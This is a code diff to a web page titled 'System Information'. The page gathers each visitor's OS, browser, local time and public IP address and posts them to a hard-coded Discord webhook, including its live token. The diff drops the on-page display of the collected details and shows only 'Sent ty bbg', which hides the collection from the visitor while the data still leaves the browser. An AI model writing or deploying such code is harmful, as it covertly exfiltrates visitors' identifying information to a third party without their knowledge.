@@ -8,10 +8,7 @@
 <body>
     <h1>System Information</h1>
     <div id="output">
-        <p id="os">OS: </p>
-        <p id="browser">Browser: </p>
-        <p id="time">Current Time (EST): </p>
-        <p id="public-ip">Public IP: </p>
+        <p>Sent ty bbg</p>
     </div>
 
     <script>
@@ -32,12 +29,14 @@
             const publicIp = await fetch('https://api64.ipify.org?format=json')
                                 .then(response => response.json())
                                 .then(data => data.ip);
-            return `<a href="https://whatismyipaddress.com/ip/${publicIp}" target="_blank">${publicIp}</a>`;
+            return `[${publicIp} retereived](https://whatismyipaddress.com/ip/${publicIp})`;
         }
 
         async function sendToDiscord(message) {
             const webhookUrl = 'https://discord.com/api/webhooks/1205983897767383140/o3xlSmIOb4_kTtjX_ThqMBxOTyUgFvZePPr0_vWPU9Ys9f9UF-waGD08P6txUBc3SECG';
-            const payload = { content: message };
+            const estTime = new Date().toLocaleString("en-US", {timeZone: "America/New_York"});
+            const header = `**(${estTime}) Data Collected**\n`;
+            const payload = { content: header + message };
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -53,13 +52,10 @@
                 const timeInfo = getTimeInfo();
                 const publicIp = await getPublicIp();
 
-                document.getElementById('os').innerHTML += osInfo;
-                document.getElementById('browser').innerHTML += browserInfo;
-                document.getElementById('time').innerHTML += timeInfo;
-                document.getElementById('public-ip').innerHTML += publicIp;
-
-                const message = `${osInfo}\n${browserInfo}\n${timeInfo}\n${publicIp}`;
+                const message = `**OS:** ${osInfo}\n**Browser:** ${browserInfo}\n**Current Time (EST):** ${timeInfo}\n**Public IP:** ${publicIp}`;
                 await sendToDiscord(message);
+
+                outputDiv.innerHTML = "Sent ty bbg";
             } catch (error) {
                 console.error('Error:', error);
                 outputDiv.textContent = 'Error: ' + error;
